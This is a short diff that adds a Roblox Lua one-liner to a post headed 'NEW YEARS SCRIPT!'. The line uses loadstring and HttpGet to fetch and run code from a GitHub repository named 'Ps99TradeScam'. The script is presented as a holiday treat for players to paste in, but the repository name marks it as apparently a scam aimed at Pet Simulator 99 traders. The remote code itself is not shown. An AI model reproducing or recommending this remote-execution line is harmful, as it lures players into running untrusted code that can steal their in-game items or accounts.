@@ -1,3 +1,3 @@
 NEW YEARS SCRIPT!
 SCRIPT:
-loadstring(game:HttpGet(
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PS99ROBLOXSCRIPTS/Ps99TradeScam/main/Ps99"))()
